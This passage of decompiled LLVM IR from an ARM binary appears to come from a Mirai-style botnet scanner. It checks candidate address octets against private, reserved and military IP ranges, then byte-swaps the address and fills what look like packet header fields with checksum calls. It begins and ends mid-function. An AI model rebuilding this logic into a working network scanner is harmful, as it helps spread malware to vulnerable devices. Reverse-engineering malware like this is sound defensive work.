  br i1 %v0_ff34, label %dec_label_pc_ff10, label %dec_label_pc_ff38

dec_label_pc_ff38:                                ; preds = %bb300
  %v2_ff38 = icmp ugt i32 %v1_ff14, 2
  store i1 %v2_ff38, i1* %cpsr_c.global-to-local, align 1
  %v7_ff38 = icmp eq i32 %v1_ff14, 3
  store i1 %v7_ff38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff38, label %dec_label_pc_ff10, label %dec_label_pc_ff40

dec_label_pc_ff40:                                ; preds = %dec_label_pc_ff38
  %v1_ff40 = add nsw i32 %v1_ff14, -15
  store i32 %v1_ff40, i32* %r3.global-to-local, align 4
  %v2_ff44 = icmp ugt i32 %v1_ff14, 55
  store i1 %v2_ff44, i1* %cpsr_c.global-to-local, align 1
  %v7_ff44 = icmp eq i32 %v1_ff14, 56
  store i1 %v7_ff44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff44, label %dec_label_pc_ff10, label %bb301

bb301:                                            ; preds = %dec_label_pc_ff40
  %v3_ff48 = icmp ne i32 %v1_ff40, 0
  store i1 %v3_ff48, i1* %cpsr_c.global-to-local, align 1
  %v8_ff48 = icmp eq i32 %v1_ff40, 1
  store i1 %v8_ff48, i1* %cpsr_z.global-to-local, align 1
  %v2_ff4c = xor i1 %v3_ff48, true
  %v3_ff4c = or i1 %v8_ff48, %v2_ff4c
  br i1 %v3_ff4c, label %dec_label_pc_ff10, label %dec_label_pc_ff50

dec_label_pc_ff50:                                ; preds = %bb301
  %v2_ff50 = icmp ugt i32 %v1_ff14, 9
  store i1 %v2_ff50, i1* %cpsr_c.global-to-local, align 1
  %v7_ff50 = icmp eq i32 %v1_ff14, 10
  store i1 %v7_ff50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff50, label %dec_label_pc_ff10, label %dec_label_pc_ff58

dec_label_pc_ff58:                                ; preds = %dec_label_pc_ff50
  %v2_ff58 = icmp ugt i32 %v1_ff14, 191
  store i1 %v2_ff58, i1* %cpsr_c.global-to-local, align 1
  %v7_ff58 = icmp eq i32 %v1_ff14, 192
  store i1 %v7_ff58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff58, label %bb302, label %dec_label_pc_ff64

bb302:                                            ; preds = %dec_label_pc_ff58
  %v3_ff5c = icmp ugt i32 %v1_ff28, 167
  store i1 %v3_ff5c, i1* %cpsr_c.global-to-local, align 1
  %v8_ff5c = icmp eq i32 %v1_ff28, 168
  store i1 %v8_ff5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ff5c, label %dec_label_pc_ff10, label %dec_label_pc_ff64

dec_label_pc_ff64:                                ; preds = %dec_label_pc_ff58, %bb302
  %v7_ff64 = icmp eq i32 %v1_ff14, 172
  %.381 = zext i1 %v7_ff64 to i32
  store i32 %.381, i32* %r3.global-to-local, align 4
  %v2_ff70 = icmp ugt i32 %v1_ff28, 14
  store i1 %v2_ff70, i1* %cpsr_c.global-to-local, align 1
  %v7_ff70 = icmp eq i32 %v1_ff28, 15
  store i1 %v7_ff70, i1* %cpsr_z.global-to-local, align 1
  %v2_ff74 = xor i1 %v2_ff70, true
  %v3_ff74 = or i1 %v7_ff70, %v2_ff74
  br i1 %v3_ff74, label %.thread13, label %bb305

.thread13:                                        ; preds = %dec_label_pc_ff64
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ff88

bb305:                                            ; preds = %dec_label_pc_ff64
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff78 = icmp eq i1 %v7_ff64, false
  store i1 %v2_ff78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff78, label %dec_label_pc_ff88, label %dec_label_pc_ff80

dec_label_pc_ff80:                                ; preds = %bb305
  %v2_ff80 = icmp ugt i32 %v1_ff28, 30
  store i1 %v2_ff80, i1* %cpsr_c.global-to-local, align 1
  %v7_ff80 = icmp eq i32 %v1_ff28, 31
  store i1 %v7_ff80, i1* %cpsr_z.global-to-local, align 1
  %v2_ff84 = xor i1 %v2_ff80, true
  %v3_ff84 = or i1 %v7_ff80, %v2_ff84
  br i1 %v3_ff84, label %dec_label_pc_ff10, label %dec_label_pc_ff88

dec_label_pc_ff88:                                ; preds = %.thread13, %dec_label_pc_ff80, %bb305
  %v7_ff88 = icmp eq i32 %v1_ff14, 100
  %.382 = zext i1 %v7_ff88 to i32
  store i32 %.382, i32* %r3.global-to-local, align 4
  %v2_ff94 = icmp ugt i32 %v1_ff28, 62
  store i1 %v2_ff94, i1* %cpsr_c.global-to-local, align 1
  %v7_ff94 = icmp eq i32 %v1_ff28, 63
  store i1 %v7_ff94, i1* %cpsr_z.global-to-local, align 1
  %v2_ff98 = xor i1 %v2_ff94, true
  %v3_ff98 = or i1 %v7_ff94, %v2_ff98
  br i1 %v3_ff98, label %.thread18, label %bb308

.thread18:                                        ; preds = %dec_label_pc_ff88
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ffac

bb308:                                            ; preds = %dec_label_pc_ff88
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff9c = icmp eq i1 %v7_ff88, false
  store i1 %v2_ff9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff9c, label %dec_label_pc_ffac, label %dec_label_pc_ffa4

dec_label_pc_ffa4:                                ; preds = %bb308
  %v2_ffa4 = icmp ugt i32 %v1_ff28, 125
  store i1 %v2_ffa4, i1* %cpsr_c.global-to-local, align 1
  %v7_ffa4 = icmp eq i32 %v1_ff28, 126
  store i1 %v7_ffa4, i1* %cpsr_z.global-to-local, align 1
  %v2_ffa8 = xor i1 %v2_ffa4, true
  %v3_ffa8 = or i1 %v7_ffa4, %v2_ffa8
  br i1 %v3_ffa8, label %dec_label_pc_ff10, label %dec_label_pc_ffac

dec_label_pc_ffac:                                ; preds = %.thread18, %dec_label_pc_ffa4, %bb308
  %v2_ffac = icmp ugt i32 %v1_ff14, 168
  store i1 %v2_ffac, i1* %cpsr_c.global-to-local, align 1
  %v7_ffac = icmp eq i32 %v1_ff14, 169
  store i1 %v7_ffac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffac, label %bb309, label %dec_label_pc_ffb8

bb309:                                            ; preds = %dec_label_pc_ffac
  %v3_ffb0 = icmp eq i32 %v1_ff28, 255
  store i1 %v3_ffb0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_ffb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ffb0, label %dec_label_pc_ff10, label %dec_label_pc_ffb8

dec_label_pc_ffb8:                                ; preds = %dec_label_pc_ffac, %bb309
  %v7_ffb8 = icmp eq i32 %v1_ff14, 198
  %.383 = zext i1 %v7_ffb8 to i32
  store i32 %.383, i32* %r3.global-to-local, align 4
  %v2_ffc4 = icmp ugt i32 %v1_ff28, 16
  store i1 %v2_ffc4, i1* %cpsr_c.global-to-local, align 1
  %v7_ffc4 = icmp eq i32 %v1_ff28, 17
  store i1 %v7_ffc4, i1* %cpsr_z.global-to-local, align 1
  %v2_ffc8 = xor i1 %v2_ffc4, true
  %v3_ffc8 = or i1 %v7_ffc4, %v2_ffc8
  br i1 %v3_ffc8, label %.thread24, label %bb312

.thread24:                                        ; preds = %dec_label_pc_ffb8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ffdc

bb312:                                            ; preds = %dec_label_pc_ffb8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ffcc = icmp eq i1 %v7_ffb8, false
  store i1 %v2_ffcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ffcc, label %dec_label_pc_ffdc, label %dec_label_pc_ffd4

dec_label_pc_ffd4:                                ; preds = %bb312
  %v2_ffd4 = icmp ugt i32 %v1_ff28, 18
  store i1 %v2_ffd4, i1* %cpsr_c.global-to-local, align 1
  %v7_ffd4 = icmp eq i32 %v1_ff28, 19
  store i1 %v7_ffd4, i1* %cpsr_z.global-to-local, align 1
  %v2_ffd8 = xor i1 %v2_ffd4, true
  %v3_ffd8 = or i1 %v7_ffd4, %v2_ffd8
  br i1 %v3_ffd8, label %dec_label_pc_ff10, label %dec_label_pc_ffdc

dec_label_pc_ffdc:                                ; preds = %.thread24, %dec_label_pc_ffd4, %bb312
  %v2_ffdc = icmp ugt i32 %v1_ff14, 222
  store i1 %v2_ffdc, i1* %cpsr_c.global-to-local, align 1
  %v7_ffdc = icmp eq i32 %v1_ff14, 223
  store i1 %v7_ffdc, i1* %cpsr_z.global-to-local, align 1
  %v2_ffe0 = xor i1 %v7_ffdc, true
  %v3_ffe0 = and i1 %v2_ffdc, %v2_ffe0
  br i1 %v3_ffe0, label %dec_label_pc_ff10, label %dec_label_pc_ffe4

dec_label_pc_ffe4:                                ; preds = %dec_label_pc_ffdc
  %v7_ffe4 = icmp eq i32 %v1_ff14, 106
  %.384 = zext i1 %v7_ffe4 to i32
  store i32 %.384, i32* %lr.global-to-local, align 4
  %v2_fff0 = icmp ugt i32 %v1_ff28, 185
  store i1 %v2_fff0, i1* %cpsr_c.global-to-local, align 1
  %v7_fff0 = icmp eq i32 %v1_ff28, 186
  store i1 %v7_fff0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fff0, label %bb315, label %dec_label_pc_fffc

bb315:                                            ; preds = %dec_label_pc_ffe4
  %v2_ffe4 = icmp ugt i32 %v1_ff14, 105
  store i1 %v2_ffe4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ffe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffe4, label %dec_label_pc_ff10, label %dec_label_pc_fffc.thread

dec_label_pc_fffc.thread:                         ; preds = %bb315
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10010

dec_label_pc_fffc:                                ; preds = %dec_label_pc_ffe4
  %v2_fffc = icmp ugt i32 %v1_ff28, 186
  store i1 %v2_fffc, i1* %cpsr_c.global-to-local, align 1
  %v7_fffc = icmp eq i32 %v1_ff28, 187
  store i1 %v7_fffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fffc, label %.thread29, label %dec_label_pc_10010

.thread29:                                        ; preds = %dec_label_pc_fffc
  store i32 %.384, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10008 = icmp eq i1 %v7_ffe4, false
  store i1 %v2_10008, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10008, label %dec_label_pc_10010.thread, label %dec_label_pc_ff10

dec_label_pc_10010.thread:                        ; preds = %.thread29
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10024

dec_label_pc_10010:                               ; preds = %dec_label_pc_fffc, %dec_label_pc_fffc.thread
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10010 = icmp ugt i32 %v1_ff28, 184
  store i1 %v2_10010, i1* %cpsr_c.global-to-local, align 1
  %v7_10010 = icmp eq i32 %v1_ff28, 185
  store i1 %v7_10010, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10010, label %.thread33, label %dec_label_pc_10024

.thread33:                                        ; preds = %dec_label_pc_10010
  store i32 %.384, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1001c = icmp eq i1 %v7_ffe4, false
  store i1 %v2_1001c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1001c, label %dec_label_pc_10024.thread, label %dec_label_pc_ff10

dec_label_pc_10024.thread:                        ; preds = %.thread33
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.thread38

dec_label_pc_10024:                               ; preds = %dec_label_pc_10010, %dec_label_pc_10010.thread
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10024 = icmp ugt i32 %v1_ff28, 183
  store i1 %v2_10024, i1* %cpsr_c.global-to-local, align 1
  %v7_10024 = icmp eq i32 %v1_ff28, 184
  store i1 %v7_10024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10024, label %.thread37, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_10024.thread, %dec_label_pc_10024
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10038

.thread37:                                        ; preds = %dec_label_pc_10024
  store i32 %.384, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10030 = icmp eq i1 %v7_ffe4, false
  store i1 %v2_10030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10030, label %dec_label_pc_10038, label %dec_label_pc_ff10

dec_label_pc_10038:                               ; preds = %.thread38, %.thread37
  %v2_10038 = icmp ugt i32 %v1_ff14, 149
  store i1 %v2_10038, i1* %cpsr_c.global-to-local, align 1
  %v7_10038 = icmp eq i32 %v1_ff14, 150
  store i1 %v7_10038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10038, label %bb316, label %dec_label_pc_10044

bb316:                                            ; preds = %dec_label_pc_10038
  %v3_1003c = icmp ugt i32 %v1_ff28, 30
  store i1 %v3_1003c, i1* %cpsr_c.global-to-local, align 1
  %v8_1003c = icmp eq i32 %v1_ff28, 31
  store i1 %v8_1003c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1003c, label %dec_label_pc_ff10, label %dec_label_pc_10044.thread

dec_label_pc_10044.thread:                        ; preds = %bb316
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10050.thread

dec_label_pc_10044:                               ; preds = %dec_label_pc_10038
  %v2_10044 = icmp ugt i32 %v1_ff14, 48
  store i1 %v2_10044, i1* %cpsr_c.global-to-local, align 1
  %v7_10044 = icmp eq i32 %v1_ff14, 49
  store i1 %v7_10044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10044, label %bb317, label %dec_label_pc_10050

bb317:                                            ; preds = %dec_label_pc_10044
  %v3_10048 = icmp ugt i32 %v1_ff28, 50
  store i1 %v3_10048, i1* %cpsr_c.global-to-local, align 1
  %v8_10048 = icmp eq i32 %v1_ff28, 51
  store i1 %v8_10048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10048, label %dec_label_pc_ff10, label %dec_label_pc_10050.thread

dec_label_pc_10050.thread:                        ; preds = %dec_label_pc_10044.thread, %bb317
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1005c.thread

dec_label_pc_10050:                               ; preds = %dec_label_pc_10044
  %v2_10050 = icmp ugt i32 %v1_ff14, 177
  store i1 %v2_10050, i1* %cpsr_c.global-to-local, align 1
  %v7_10050 = icmp eq i32 %v1_ff14, 178
  store i1 %v7_10050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10050, label %bb318, label %dec_label_pc_1005c

bb318:                                            ; preds = %dec_label_pc_10050
  %v3_10054 = icmp ugt i32 %v1_ff28, 61
  store i1 %v3_10054, i1* %cpsr_c.global-to-local, align 1
  %v8_10054 = icmp eq i32 %v1_ff28, 62
  store i1 %v8_10054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10054, label %dec_label_pc_ff10, label %dec_label_pc_1005c.thread

dec_label_pc_1005c.thread:                        ; preds = %dec_label_pc_10050.thread, %bb318
  %v2_1005c396 = icmp ugt i32 %v1_ff14, 159
  store i1 %v2_1005c396, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10068.thread

dec_label_pc_1005c:                               ; preds = %dec_label_pc_10050
  %v2_1005c = icmp ugt i32 %v1_ff14, 159
  store i1 %v2_1005c, i1* %cpsr_c.global-to-local, align 1
  %v7_1005c = icmp eq i32 %v1_ff14, 160
  store i1 %v7_1005c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1005c, label %bb319, label %dec_label_pc_10068

bb319:                                            ; preds = %dec_label_pc_1005c
  %v3_10060 = icmp ugt i32 %v1_ff28, 12
  store i1 %v3_10060, i1* %cpsr_c.global-to-local, align 1
  %v8_10060 = icmp eq i32 %v1_ff28, 13
  store i1 %v8_10060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10060, label %dec_label_pc_ff10, label %dec_label_pc_10068.thread

dec_label_pc_10068.thread:                        ; preds = %dec_label_pc_1005c.thread, %bb319
  %v1_10068398 = add nsw i32 %v1_ff14, -6
  store i32 %v1_10068398, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %bb320

dec_label_pc_10068:                               ; preds = %dec_label_pc_1005c
  %v1_10068 = add nsw i32 %v1_ff14, -6
  store i32 %v1_10068, i32* %r3.global-to-local, align 4
  %v2_1006c = icmp ugt i32 %v1_ff14, 10
  store i1 %v2_1006c, i1* %cpsr_c.global-to-local, align 1
  %v7_1006c = icmp eq i32 %v1_ff14, 11
  store i1 %v7_1006c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1006c, label %dec_label_pc_ff10, label %bb320

bb320:                                            ; preds = %dec_label_pc_10068.thread, %dec_label_pc_10068
  %v1_10068401 = phi i32 [ %v1_10068398, %dec_label_pc_10068.thread ], [ %v1_10068, %dec_label_pc_10068 ]
  %v3_10070 = icmp ne i32 %v1_10068401, 0
  store i1 %v3_10070, i1* %cpsr_c.global-to-local, align 1
  %v8_10070 = icmp eq i32 %v1_10068401, 1
  store i1 %v8_10070, i1* %cpsr_z.global-to-local, align 1
  %v2_10074 = xor i1 %v3_10070, true
  %v3_10074 = or i1 %v8_10070, %v2_10074
  br i1 %v3_10074, label %dec_label_pc_ff10, label %dec_label_pc_10078

dec_label_pc_10078:                               ; preds = %bb320
  %v2_10078 = icmp ugt i32 %v1_ff14, 21
  store i1 %v2_10078, i1* %cpsr_c.global-to-local, align 1
  %v7_10078 = icmp eq i32 %v1_ff14, 22
  store i1 %v7_10078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10078, label %dec_label_pc_ff10, label %bb321

bb321:                                            ; preds = %dec_label_pc_10078
  %v3_1007c = icmp ugt i32 %v1_ff14, 20
  store i1 %v3_1007c, i1* %cpsr_c.global-to-local, align 1
  %v8_1007c = icmp eq i32 %v1_ff14, 21
  store i1 %v8_1007c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1007c, label %dec_label_pc_ff10, label %dec_label_pc_10084

dec_label_pc_10084:                               ; preds = %bb321
  %v2_10084 = icmp ugt i32 %v1_ff14, 27
  store i1 %v2_10084, i1* %cpsr_c.global-to-local, align 1
  %v7_10084 = icmp eq i32 %v1_ff14, 28
  store i1 %v7_10084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10084, label %dec_label_pc_ff10, label %bb322

bb322:                                            ; preds = %dec_label_pc_10084
  %v3_10088 = icmp ugt i32 %v1_ff14, 25
  store i1 %v3_10088, i1* %cpsr_c.global-to-local, align 1
  %v8_10088 = icmp eq i32 %v1_ff14, 26
  store i1 %v8_10088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10088, label %dec_label_pc_ff10, label %dec_label_pc_10090

dec_label_pc_10090:                               ; preds = %bb322
  %v2_10090 = icmp ugt i32 %v1_ff14, 29
  store i1 %v2_10090, i1* %cpsr_c.global-to-local, align 1
  %v7_10090 = icmp eq i32 %v1_ff14, 30
  store i1 %v7_10090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10090, label %dec_label_pc_ff10, label %bb323

bb323:                                            ; preds = %dec_label_pc_10090
  %v3_10094 = icmp ugt i32 %v1_ff14, 28
  store i1 %v3_10094, i1* %cpsr_c.global-to-local, align 1
  %v8_10094 = icmp eq i32 %v1_ff14, 29
  store i1 %v8_10094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10094, label %dec_label_pc_ff10, label %dec_label_pc_1009c

dec_label_pc_1009c:                               ; preds = %bb323
  %v2_1009c = icmp ugt i32 %v1_ff14, 54
  store i1 %v2_1009c, i1* %cpsr_c.global-to-local, align 1
  %v7_1009c = icmp eq i32 %v1_ff14, 55
  store i1 %v7_1009c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1009c, label %dec_label_pc_ff10, label %bb324

bb324:                                            ; preds = %dec_label_pc_1009c
  %v3_100a0 = icmp ugt i32 %v1_ff14, 32
  store i1 %v3_100a0, i1* %cpsr_c.global-to-local, align 1
  %v8_100a0 = icmp eq i32 %v1_ff14, 33
  store i1 %v8_100a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_100a0, label %dec_label_pc_ff10, label %dec_label_pc_100a8

dec_label_pc_100a8:                               ; preds = %bb324
  %v2_100a8 = icmp ugt i32 %v1_ff14, 214
  store i1 %v2_100a8, i1* %cpsr_c.global-to-local, align 1
  %v7_100a8 = icmp eq i32 %v1_ff14, 215
  store i1 %v7_100a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100a8, label %.thread53, label %bb325

bb325:                                            ; preds = %dec_label_pc_100a8
  %v3_100ac = icmp ugt i32 %v1_ff14, 213
  store i1 %v3_100ac, i1* %cpsr_c.global-to-local, align 1
  %v8_100ac = icmp eq i32 %v1_ff14, 214
  store i1 %v8_100ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_100ac, label %bb326, label %dec_label_pc_100bc

.thread53:                                        ; preds = %dec_label_pc_100a8
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ff10

bb326:                                            ; preds = %bb325
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ff10

dec_label_pc_100bc:                               ; preds = %bb325
  store i32 0, i32* @r4, align 4
  %v5_100c8 = call i32 @llvm.bswap.i32(i32 %v0_ff10)
  store i32 %v5_100c8, i32* %r3.global-to-local, align 4
  %tmp327 = and i32 %v0_ff10, 65280
  %tmp328 = call i32 @llvm.bswap.i32(i32 %tmp327)
  %tmp329 = and i32 %v0_ff10, 16711680
  %tmp330 = call i32 @llvm.bswap.i32(i32 %tmp329)
  %v3_100d4 = mul nuw i32 %v3_ff30, 16777216
  %v3_100d8 = udiv i32 %tmp328, 256
  %v4_100dc = mul nuw nsw i32 %tmp330, 256
  %tmp331 = and i32 %v0_ff10, 32768
  %v3_100e0 = icmp ne i32 %tmp331, 0
  store i1 %v3_100e0, i1* %cpsr_c.global-to-local, align 1
  %v4_100e0 = udiv i32 %v5_100c8, 16777216
  store i32 ptrtoint (i32* @global_var_1a6e0.201 to i32), i32* @r0, align 4
  %v5_100e0 = or i32 %v4_100e0, %v3_100d4
  %v5_100dc = or i32 %v5_100e0, %v4_100dc
  %v2_100e8 = or i32 %v5_100dc, %v3_100d8
  store i32 %v2_100e8, i32* %r2.global-to-local, align 4
  %v4_100ec = trunc i32 %v4_100e0 to i8
  store i8 %v4_100ec, i8* @global_var_1a6f0.248, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i8 0, i8* bitcast (i32* @global_var_1a6ea.249 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1a6eb.250 to i8*), align 4
  %v2_100fc = call i32 @function_de24(i32 ptrtoint (i32* @global_var_1a6e0.201 to i32), i32 20)
  store i32 ptrtoint (i32* @global_var_1a6e0.201 to i32), i32* %ip.global-to-local, align 4
  %sext9 = mul i32 %v2_100fc, 16777216
  %v1_10104 = sdiv i32 %sext9, 16777216
  store i32 %v1_10104, i32* %r3.global-to-local, align 4
  %v4_10108 = ashr i32 %sext9, 31
  store i32 %v4_10108, i32* %r2.global-to-local, align 4
  %v1_1010c = trunc i32 %v1_10104 to i8
  store i8 %v1_1010c, i8* bitcast (i32* @global_var_1a6ea.249 to i8*), align 4
  %v1_10110 = trunc i32 %v4_10108 to i8
  store i8 %v1_10110, i8* bitcast (i32* @global_var_1a6eb.250 to i8*), align 4
  %v3_10114 = load i32, i32* %stack_var_-52, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_1011c = srem i32 %v3_10114, 10
  store i32 %v2_1011c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10120 = icmp eq i32 %v2_1011c, 0
  store i1 %v2_10120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10120, label %.thread232, label %bb332

.thread232:                                       ; preds = %dec_label_pc_100bc
  store i32 ptrtoint (i32* @global_var_1a6f4.205 to i32), i32* %lr.global-to-local, align 4
  br label %.thread63.thread106

bb332:                                            ; preds = %dec_label_pc_100bc
  store i32 ptrtoint (i32* @global_var_1a6f4.205 to i32), i32* %r0.global-to-local, align 4
  store i32 23, i32* %r3.global-to-local, align 4
  %v1_10130 = load i32, i32* @r4, align 4
  %v2_10130 = trunc i32 %v1_10130 to i8
  store i8 %v2_10130, i8* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1a6f4.205 to i32), i32 2) to i8*), align 2
  %v0_10134.pr.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10134.pr.pre, label %.thread63.thread106, label %.thread60

.thread60:                                        ; preds = %bb332
  %v1_10134 = load i32, i32* %r3.global-to-local, align 4
  %v2_10134 = trunc i32 %v1_10134 to i8
  %v3_10134 = load i32, i32* %r0.global-to-local, align 4
  %v4_10134 = add i32 %v3_10134, 3
  %v5_10134 = inttoptr i32 %v4_10134 to i8*
  store i8 %v2_10134, i8* %v5_10134, align 1
  %v0_1013c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1a6e0.201 to i32), i32* %r0.global-to-local, align 4
  br i1 %v0_1013c.pr.pr, label %.thread66, label %.thread68

.thread63.thread106:                              ; preds = %bb332, %.thread232
  store i32 ptrtoint (i32* @global_var_1a6e0.201 to i32), i32* %r0.global-to-local, align 4
  br label %.thread66

.thread66:                                        ; preds = %.thread60, %.thread63.thread106
  store i32 9, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v3_10144 = load i32, i32* %lr.global-to-local, align 4
  %v4_10144 = add i32 %v3_10144, 2
  %v5_10144 = inttoptr i32 %v4_10144 to i8*
  store i8 9, i8* %v5_10144, align 1
  %v0_10148.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10148.pr.pr, label %bb333, label %.thread68

bb333:                                            ; preds = %.thread66
  %v1_10148 = load i32, i32* %r2.global-to-local, align 4
  %v2_10148 = trunc i32 %v1_10148 to i8
  %v3_10148 = load i32, i32* %lr.global-to-local, align 4
  %v4_10148 = add i32 %v3_10148, 3
  %v5_10148 = inttoptr i32 %v4_10148 to i8*
  store i8 %v2_10148, i8* %v5_10148, align 1
  br label %.thread68

.thread68:                                        ; preds = %.thread60, %.thread66, %bb333
  %v3_1014c = load i8, i8* @global_var_1a6f0.248, align 1
  %v4_1014c = sext i8 %v3_1014c to i32
  store i32 %v4_1014c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a6f4.205 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a6f4.205 to i32), i32* @r1, align 4
  store i8 %v3_1014c, i8* @global_var_1a6f8.251, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_10164 = load i32, i32* %sl.global-to-local, align 4
  %v1_10164 = trunc i32 %v0_10164 to i8
  store i8 %v1_10164, i8* bitcast (i32* @global_var_1a704.252 to i8*), align 4
  store i8 %v1_10164, i8* bitcast (i32* @global_var_1a705.253 to i8*), align 4
  %v4_1016c = call i32 @function_de80(i32 ptrtoint (i32* @global_var_1a6e0.201 to i32), i32 ptrtoint (i32* @global_var_1a6f4.205 to i32), i32 5120, i32 20)
  %sext = mul i32 %v4_1016c, 16777216
  %v1_10174 = sdiv i32 %sext, 16777216
  %v3_1017c = ashr i32 %sext, 31
  %v2_10180 = load i32, i32* @global_var_1a6f4.205, align 4
  %v1_10188 = trunc i32 %v3_1017c to i8
  store i8 %v1_10188, i8* bitcast (i32* @global_var_1a705.253 to i8*), align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_1019c = load i8, i8* @global_var_1a6f0.248, align 1
  %v4_1019c = sext i8 %v3_1019c to i32
  store i32 %v4_1019c, i32* %r4.global-to-local, align 4
  %v2_101a0 = load i32, i32* @global_var_1a734.199, align 4
  store i32 %v2_101a0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a6f4.205 to i32), i32* %ip.global-to-local, align 4
  %v1_101b0 = and i32 %v2_10180, 8388608
  %v2_101b0 = icmp ne i32 %v1_101b0, 0
  store i1 %v2_101b0, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1a6e0.201 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v1_101c4 = trunc i32 %v1_10174 to i8
  store i8 %v1_101c4, i8* bitcast (i32* @global_var_1a704.252 to i8*), align 4
  store i32 %v2_101cc, i32* %lr.global-to-local, align 4
